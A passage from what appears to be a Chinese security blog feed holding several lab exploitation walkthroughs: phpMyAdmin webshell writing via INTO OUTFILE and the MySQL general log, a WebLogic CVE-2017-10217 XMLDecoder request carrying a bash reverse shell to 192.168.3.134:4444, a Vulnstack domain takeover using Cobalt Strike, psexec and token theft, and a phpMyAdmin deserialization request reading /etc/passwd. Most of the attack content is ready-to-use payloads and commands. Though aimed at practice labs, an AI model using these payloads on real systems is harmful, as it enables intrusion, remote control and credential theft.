        <content type="html"><![CDATA[<h1 id="phpmyadmin后台getshell"><a href="#phpmyadmin后台getshell" class="headerlink" title="phpmyadmin后台getshell"></a>phpmyadmin后台getshell</h1><h2 id="select-into-outfile导出木马"><a href="#select-into-outfile导出木马" class="headerlink" title="select into outfile导出木马"></a>select into outfile导出木马</h2><blockquote><p>web目录写权限</p><p>知道网站绝对路径</p><p>secure_file_priv没有具体值</p></blockquote><p>通过命令查看路径</p><pre class=" language-mysql"><code class="language-mysql">select @@basedir;</code></pre><p><img src="/2022/05/24/phpmyadmin-webshell/image-20220524200554126.png" alt="image-20220524200554126"></p><p>通过这个路径可以推断出web路径<code>C:\phpstudy_pro\www\</code></p><p>查看参数</p><pre class=" language-mysql"><code class="language-mysql">show global variables like '%secure%';</code></pre><p><img src="/2022/05/24/phpmyadmin-webshell/image-20220524200756560.png" alt="image-20220524200756560"></p><blockquote><p>当value为“null”时，不允许读取任意文件</p><p>当value为“空”时，允许读取任意文件</p><p>value也可设置为其他路径</p></blockquote><p>此时是<code>NULL</code>的情况下不能导出文件，需要在<code>my.ini</code>中加入<code>secure_file_priv =&quot;&quot;</code></p><p>最常用的是通过<code>into outfile</code>在网站根目录上直接写入一句话木马：</p><pre class=" language-mysql"><code class="language-mysql">select '<?php eval($_POST[cmd]); ?>' into outfile 'C:\phpstudy_pro\www\flag.php';</code></pre><h2 id="利用mysql日志"><a href="#利用mysql日志" class="headerlink" title="利用mysql日志"></a>利用mysql日志</h2><blockquote><p>Mysql 5.0版本以上会创建日志文件，通过修改日志的全局变量，也可以getshell。但是也要对生成的日志有可读可写的权限。</p></blockquote><p>需要两个全局变量<code>general_log</code>和<code>general_log file</code></p><blockquote><p><strong>general log</strong> 指的是日志保存状态，ON代表开启 OFF代表关闭；</p><p><strong>general log file</strong> 指的是日志的保存路径。</p></blockquote><p>查看日志状态</p><pre class=" language-mysql"><code class="language-mysql">show variables like '%general%';</code></pre><p><img src="/2022/05/24/phpmyadmin-webshell/image-20220524201434432.png" alt="image-20220524201434432"></p><p>修改<code>general_log</code>为<code>ON</code></p><pre class=" language-mysql"><code class="language-mysql">SET GLOBAL general_log='on';</code></pre><p>将<code>general_log_file</code>的路径改成<code>C:/phpstudy_pro/www/flag.php</code></p><pre class=" language-mysql"><code class="language-mysql">SET GLOBAL general_log_file='C:/phpstudy_pro/www/flag.php';</code></pre><p><img src="/2022/05/24/phpmyadmin-webshell/image-20220524202147435.png" alt="image-20220524202147435"></p><p>可以写入一句话木马</p><pre class=" language-mysql"><code class="language-mysql">SELECT '<?php eval($_POST["cmd"]);?>'</code></pre><p><img src="/2022/05/24/phpmyadmin-webshell/image-20220524202315040.png" alt="image-20220524202315040"></p><p>访问<code>flag.php</code>看看</p><p><img src="/2022/05/24/phpmyadmin-webshell/image-20220524202509908.png" alt="image-20220524202509908"></p><p>成功写入<code>webshell</code></p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2017/09/让webapp的UI体验更接近原生的小技巧/">让webapp的UI体验更接近原生的小技巧</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> phpmyadmin </tag>
            
            <tag> web </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebLogic XMLDecoder反序列化漏洞(CVE-2017-10217)</title>
      <link href="/2022/05/15/WebLogic-wls-xml/"/>
      <url>/2022/05/15/WebLogic-wls-xml/</url>
      
        <content type="html"><![CDATA[<h1 id="Weblogic-反序列化漏洞-CVE-2017-10217"><a href="#Weblogic-反序列化漏洞-CVE-2017-10217" class="headerlink" title="Weblogic 反序列化漏洞(CVE-2017-10217)"></a>Weblogic 反序列化漏洞(CVE-2017-10217)</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote><p>10.3.6.0, 12.1.3.0, 12.2.1.0, 12.2.1.1 , 12.2.1.2</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd vulhub/weblogic/CVE-2017-10217docker-compose up -d</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先打开<code>http://192.168.3.151:7001</code></p><p><img src="/2022/05/15/WebLogic-wls-xml/image-20220515164257738.png" alt="image-20220515164257738"></p><p>出现这个说明环境搭建没问题</p><p>触发漏洞的url是<code>/wls-wsat/CoordinatorPortType</code>,访问一下看看</p><p><img src="/2022/05/15/WebLogic-wls-xml/image-20220515164408924.png" alt="image-20220515164408924"></p><p>打开<code>burpsuite</code>，抓取这里的数据包，修改数据包</p><p><img src="/2022/05/15/WebLogic-wls-xml/image-20220515165016888.png" alt="image-20220515165016888"></p><p>修改数据包</p><pre class=" language-bash"><code class="language-bash">POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: 192.168.3.151:7001User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 6.1<span class="token punctuation">;</span> WOW64<span class="token punctuation">;</span> rv:52.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8Accept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,en-US<span class="token punctuation">;</span>q<span class="token operator">=</span>0.5,en<span class="token punctuation">;</span>q<span class="token operator">=</span>0.3DNT: 1Content-Type: text/xmlConnection: closeUpgrade-Insecure-Requests: 1Content-Length: 638<span class="token operator">&lt;</span>soapenv:Envelope xmlns:soapenv<span class="token operator">=</span><span class="token string">"http://schemas.xmlsoap.org/soap/envelope/"</span><span class="token operator">></span> <span class="token operator">&lt;</span>soapenv:Header<span class="token operator">></span><span class="token operator">&lt;</span>work:WorkContext xmlns:work<span class="token operator">=</span><span class="token string">"http://bea.com/2004/06/soap/workarea/"</span><span class="token operator">></span><span class="token operator">&lt;</span>java version<span class="token operator">=</span><span class="token string">"1.4.0"</span> class<span class="token operator">=</span><span class="token string">"java.beans.XMLDecoder"</span><span class="token operator">></span><span class="token operator">&lt;</span>void class<span class="token operator">=</span><span class="token string">"java.lang.ProcessBuilder"</span><span class="token operator">></span><span class="token operator">&lt;</span>array class<span class="token operator">=</span><span class="token string">"java.lang.String"</span> length<span class="token operator">=</span><span class="token string">"3"</span><span class="token operator">></span><span class="token operator">&lt;</span>void index<span class="token operator">=</span><span class="token string">"0"</span><span class="token operator">></span><span class="token operator">&lt;</span>string<span class="token operator">></span>/bin/bash<span class="token operator">&lt;</span>/string<span class="token operator">></span><span class="token operator">&lt;</span>/void<span class="token operator">></span><span class="token operator">&lt;</span>void index<span class="token operator">=</span><span class="token string">"1"</span><span class="token operator">></span><span class="token operator">&lt;</span>string<span class="token operator">></span>-c<span class="token operator">&lt;</span>/string<span class="token operator">></span><span class="token operator">&lt;</span>/void<span class="token operator">></span><span class="token operator">&lt;</span>void index<span class="token operator">=</span><span class="token string">"2"</span><span class="token operator">></span><span class="token operator">&lt;</span>string<span class="token operator">></span>bash -i <span class="token operator">&amp;</span>gt<span class="token punctuation">;</span><span class="token operator">&amp;</span>amp<span class="token punctuation">;</span> /dev/tcp/192.168.3.134/4444 0<span class="token operator">&amp;</span>gt<span class="token punctuation">;</span><span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>1<span class="token operator">&lt;</span>/string<span class="token operator">></span><span class="token operator">&lt;</span>/void<span class="token operator">></span><span class="token operator">&lt;</span>/array<span class="token operator">></span><span class="token operator">&lt;</span>void method<span class="token operator">=</span><span class="token string">"start"</span>/<span class="token operator">></span><span class="token operator">&lt;</span>/void<span class="token operator">></span><span class="token operator">&lt;</span>/java<span class="token operator">></span><span class="token operator">&lt;</span>/work:WorkContext<span class="token operator">></span><span class="token operator">&lt;</span>/soapenv:Header<span class="token operator">></span><span class="token operator">&lt;</span>soapenv:Body/<span class="token operator">></span><span class="token operator">&lt;</span>/soapenv:Envelope<span class="token operator">></span><span class="token operator">&lt;</span>/soapenv:Envelope<span class="token operator">></span></code></pre><p><img src="/2022/05/15/WebLogic-wls-xml/image-20220515165754745.png" alt="image-20220515165754745"></p><p>然后用nc连接</p><pre class=" language-Linux"><code class="language-Linux">nc -lvvp 4444</code></pre><p><img src="/2022/05/15/WebLogic-wls-xml/image-20220515165822517.png" alt="image-20220515165822517"></p><p>ok!结束！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> vulhub </tag>
            
            <tag> CVE </tag>
            
            <tag> Weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnstack红日内网渗透靶场1实战</title>
      <link href="/2022/05/13/Vulnstack-ATT-CK-1/"/>
      <url>/2022/05/13/Vulnstack-ATT-CK-1/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnstack红日内网渗透靶场1实战"><a href="#Vulnstack红日内网渗透靶场1实战" class="headerlink" title="Vulnstack红日内网渗透靶场1实战"></a>Vulnstack红日内网渗透靶场1实战</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">红日靶场1</a></p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513143217253.png" alt="image-20220513143217253"></p><p>拓扑</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513143311144.png" alt="image-20220513143311144"></p><p><code>开机密码：hongrisec@2019</code></p><table><thead><tr><th align="center">主机</th><th align="center">IP地址</th></tr></thead><tbody><tr><td align="center">win7 攻击机</td><td align="center">192.168.3.137</td></tr><tr><td align="center">win7 服务器</td><td align="center">外网：192.168.3.176；内网：192.168.52.143</td></tr><tr><td align="center">win2003 域成员主机</td><td align="center">内网：192.168.52.141</td></tr><tr><td align="center">win2008 域控主机</td><td align="center">内网：192.168.52.138</td></tr><tr><td align="center">kali 攻击机</td><td align="center">外网：192.168.3.134</td></tr></tbody></table><p>需要改一下虚拟机的网络编辑器</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513154843641.png" alt="image-20220513154843641"></p><p>仅主机模式的VMnet1网卡<code>192.168.52.0</code></p><p>然后是三个靶场的网卡配置，win7需要加一个外网网卡，设置为NAT模式</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513155047366.png" alt="image-20220513155047366"></p><p>其他的都设置成<code>自定义(VMnet1)</code></p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513155120851.png" alt="image-20220513155120851"></p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513155135386.png" alt="image-20220513155135386"></p><p>ok进行连通性测试</p><p>首先在win7上打开web服务</p><p>在c盘里找到<code>phpstudy</code>，打开</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513155807827.png" alt="image-20220513155807827"></p><p>测试一下</p><p>内网之间可以互相ping通</p><p><code>win2003</code></p><pre class=" language-bash"><code class="language-bash"><span class="token function">ping</span> 192.168.52.138</code></pre><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513160150507.png" alt="image-20220513160150507"></p><pre class=" language-bash"><code class="language-bash"><span class="token function">ping</span> 192.168.52.143</code></pre><p>发现ping不通，说明内网防火墙正常</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513160308197.png" alt="image-20220513160308197"></p><p>此时回到<code>win7web</code></p><pre class=" language-bash"><code class="language-bash"><span class="token function">ping</span> 192.168.52.138</code></pre><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513160654383.png" alt="image-20220513160654383"></p><pre class=" language-bash"><code class="language-bash"><span class="token function">ping</span> 192.168.3.134</code></pre><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513160712929.png" alt="image-20220513160712929"></p><p>ok和攻击机能ping通</p><p>此时到<code>win7</code>攻击机下面</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ping</span> 192.168.3.176</code></pre><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513161210241.png" alt="image-20220513161210241"></p><p>说明外网防火墙正常，ok连通性测试结束，开始渗透！</p><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>遇事不决，信息搜集</p><p>首先在<code>win7</code>攻击机上面用御剑跑一下</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513162131658.png" alt="image-20220513162131658"></p><p>同时kali上可以用nmap跑一下</p><pre class=" language-Linux"><code class="language-Linux">nmap -p- -A 192.168.3.176</code></pre><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513162211459.png" alt="image-20220513162211459"></p><p>还可以用<code>dirsearch</code>扫描一下</p><pre class=" language-Linux"><code class="language-Linux">dirsearch -u http://192.168.3.176</code></pre><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513162245369.png" alt="image-20220513162245369"></p><p>通过搜集，我们可以看到关键性的<code>phpmyadmin</code>和<code>beifen.rar</code></p><p>现在就有两种方法<code>getshell</code></p><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>先看看<code>beifen.rar</code></p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513162520891.png" alt="image-20220513162520891"></p><p>打开它，看到了这个使用<code>yxcms</code></p><p>打开网站<code>http://192.168.3.176/yxcms/</code>看看</p><p>在公告栏中看到</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513164250591.png" alt="image-20220513164250591"></p><p>有账号有有密码有后台，登录后台<code>http://192.168.3.176/yxcms/index.php?r=admin</code>看看</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513164347461.png" alt="image-20220513164347461"></p><p>进入之后找到能够上传文件的地方，我们找到了<code>前台模板</code>这个玩意</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513164703485.png" alt="image-20220513164703485"></p><p>点击<code>管理模板文件</code></p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513164744885.png" alt="image-20220513164744885"></p><p>点击新建</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513164805486.png" alt="image-20220513164805486"></p><p>可以写入木马了</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513165445562.png" alt="image-20220513165445562"></p><p>写完之后通过本地的备份文件找到这些模板文件存在的位置</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513165803998.png" alt="image-20220513165803998"></p><p><code>\protected\apps\default\view\default</code></p><p>通过蚁剑连接</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513170432030.png" alt="image-20220513170432030"></p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513170444847.png" alt="image-20220513170444847"></p><p>成功进入</p><h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>我们看到有<code>phpmyadmin</code></p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513170539176.png" alt="image-20220513170539176"></p><p>可以通过弱口令或者暴力破解，弱口令尝试账号密码都是<code>root</code></p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513170636914.png" alt="image-20220513170636914"></p><p>成功进入，接下来可以尝试日志注入或者写入文件</p><p>写入文件需要知道绝对路径，可以通过命令查看</p><pre class=" language-mysql"><code class="language-mysql">select @@basedir;</code></pre><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513171300843.png" alt="image-20220513171300843"></p><p>有了绝对路径<code>C:/phpStudy/MySQL/</code>就可以写入文件了</p><pre class=" language-mysql"><code class="language-mysql">select '<?php @eval($_POST["shell"]); ?>' into outfile 'c:\phpStudy\www\shell.php';</code></pre><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513181924952.png" alt="image-20220513181924952"></p><p>不行，写入失败，只能用日志写入了</p><pre class=" language-mysql"><code class="language-mysql">show variables like '%general%';</code></pre><p>查看日志状态</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513182141254.png" alt="image-20220513182141254"></p><p>我们要把<code>general_log</code>打开</p><pre class=" language-mysql"><code class="language-mysql">SET GLOBAL general_log='on';</code></pre><p>查看一下</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513183058712.png" alt="image-20220513183058712"></p><p>开启了</p><p>指定日志路径到<code>c:\phpStudy\www\shell.php</code>下    </p><pre class=" language-mysql"><code class="language-mysql">SET GLOBAL general_log_file='C:/phpStudy/www/111.php';</code></pre><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513183324710.png" alt="image-20220513183324710"></p><p>然后写入一句话木马</p><pre class=" language-mysql"><code class="language-mysql">SELECT '<?php @eval($_POST["shell"]);?>';</code></pre><p>可以用蚁剑连接一下<code>http://192.168.3.176/shell.php</code></p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513183620246.png" alt="image-20220513183620246"></p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513183651226.png" alt="image-20220513183651226"></p><p>ok，接下来要做的就是搞内网了</p><h3 id="转战内网"><a href="#转战内网" class="headerlink" title="转战内网"></a>转战内网</h3><h4 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h4><p>kali登场！</p><p>打开<code>cobalt strike</code></p><pre class=" language-Linux"><code class="language-Linux">./teamserver 192.168.3.134 123456./cobaltstrike</code></pre><p>先设置监听</p><p>然后制作一个后门</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513185153688.png" alt="image-20220513185153688"></p><p>把制作好的后门扔到<code>蚁剑</code>上面，然后执行</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513185646376.png" alt="image-20220513185646376"></p><p>执行</p><pre class=" language-bash"><code class="language-bash">start beacon.exe</code></pre><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513190110818.png" alt="image-20220513190110818"></p><p><code>kali</code>这边连接到了</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513190134631.png" alt="image-20220513190134631"></p><p>右键上面的玩意，然后提权</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513192411656.png" alt="image-20220513192411656"></p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513192424700.png" alt="image-20220513192424700"></p><p>之后就会提权到<code>system</code>权限</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513192627246.png" alt="image-20220513192627246"></p><p>接下来可以搜集一些信息了</p><pre class=" language-shell"><code class="language-shell">shell ipconfig /all</code></pre><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513194313781.png" alt="image-20220513194313781"></p><p>大致可以判断域</p><p>查看是否有多个域</p><pre class=" language-shell"><code class="language-shell">shell net view /domain</code></pre><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513194951891.png" alt="image-20220513194951891"></p><p>只有这一个域，可以查看一下域信息</p><pre class=" language-shell"><code class="language-shell">shell net view /domain:GOD</code></pre><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220513195046093.png" alt="image-20220513195046093"></p><p>查看域内别的主机信息</p><pre class=" language-shell"><code class="language-shell">net view</code></pre><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220516105236425.png" alt="image-20220516105236425"></p><h4 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h4><p>扫描端口</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220523150142185.png" alt="image-20220523150142185"></p><p>选择网段</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220523150201181.png" alt="image-20220523150201181"></p><p>点击开始扫描，扫描完之后可以查看</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220523150229539.png" alt="image-20220523150229539"></p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220523150236249.png" alt="image-20220523150236249"></p><p>可以看到内网中一共有这三个存活主机</p><p>查看本机的hash和密码</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220523151753721.png" alt="image-20220523151753721"></p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220523151800698.png" alt="image-20220523151800698"></p><p>新建一个<code>smb</code>监听</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220523152049634.png" alt="image-20220523152049634"></p><p>点击<code>spawn</code>，创建一个新的会话</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220523152210200.png" alt="image-20220523152210200"></p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220523152235025.png" alt="image-20220523152235025"></p><p>创建成功的话会有一个链子</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220523152331391.png" alt="image-20220523152331391"></p><p>此时使用<code>psexec</code></p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220523152702645.png" alt="image-20220523152702645"></p><p>选择刚才创建的会话</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220523152751481.png" alt="image-20220523152751481"></p><p>此时得到了<code>root</code>这台主机</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220523152950846.png" alt="image-20220523152950846"></p><h4 id="获取token"><a href="#获取token" class="headerlink" title="获取token"></a>获取token</h4><p>查看进程</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220523160822572.png" alt="image-20220523160822572"></p><p>在进程中找到<code>god\administrator</code>，获取令牌</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220523160932434.png" alt="image-20220523160932434"></p><p>接着用这个<code>token</code>去连接owa</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220523162735450.png" alt="image-20220523162735450"></p><p>勾选这个</p><p><img src="/2022/05/13/Vulnstack-ATT-CK-1/image-20220523162903232.png" alt="image-20220523162903232"></p><p>成功获得域控</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 靶场练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 综合实战 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 靶场练习 </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Phpmyadmin scripts/setup.php反序列化漏洞(WooYun-2016-199433)</title>
      <link href="/2022/05/12/Phpmyadmin-Deserialization/"/>
      <url>/2022/05/12/Phpmyadmin-Deserialization/</url>
      
        <content type="html"><![CDATA[<h1 id="Phpmyadmin-反序列化漏洞"><a href="#Phpmyadmin-反序列化漏洞" class="headerlink" title="Phpmyadmin 反序列化漏洞"></a>Phpmyadmin 反序列化漏洞</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>phpmyadmin 2.x版本中存在一处反序列化漏洞，通过该漏洞，攻击者可以读取任意文件或执行任意代码。</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd vulhub/phpmyadmin/WooYun-2016-199433docker-compose up -d</code></pre><h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>首先打开<code>http://192.168.3.151:8080</code></p><p><img src="/2022/05/12/Phpmyadmin-Deserialization/image-20220512155922855.png" alt="image-20220512155922855"></p><p>因为没有连接数据库所以会报错，但是这个漏洞利用跟数据库无关</p><p>访问<code>http://192.168.3.151:8080/scripts/setup.php</code></p><p><img src="/2022/05/12/Phpmyadmin-Deserialization/image-20220512160403708.png" alt="image-20220512160403708"></p><p>抓包</p><p><img src="/2022/05/12/Phpmyadmin-Deserialization/image-20220512160424711.png" alt="image-20220512160424711"></p><p>构造数据包查看<code>/etc/passwd</code></p><pre class=" language-bash"><code class="language-bash">POST /scripts/setup.php HTTP/1.1Host: your-ip:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>compatible<span class="token punctuation">;</span> MSIE 9.0<span class="token punctuation">;</span> Windows NT 6.1<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> Trident/5.0<span class="token punctuation">)</span>Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 80action<span class="token operator">=</span>test<span class="token operator">&amp;</span>configuration<span class="token operator">=</span>O:10:<span class="token string">"PMA_Config"</span>:1:<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;s:6:"source",s:11:"/etc/passwd";&amp;#125;</span></code></pre><p><img src="/2022/05/12/Phpmyadmin-Deserialization/image-20220512161347668.png" alt="image-20220512161347668"></p><p><code>ps:要把get改成post，然后加上content-type</code></p><p>结束！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> vulhub </tag>
            
            <tag> phpmyadmin </tag>
            
            <tag> WooYun </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PhpMyadmin 远程文件包含漏洞(CVE-2018-12613)</title>
      <link href="/2022/05/12/PhpMyadmin-Remote-File-Inclusion/"/>
      <url>/2022/05/12/PhpMyadmin-Remote-File-Inclusion/</url>
      
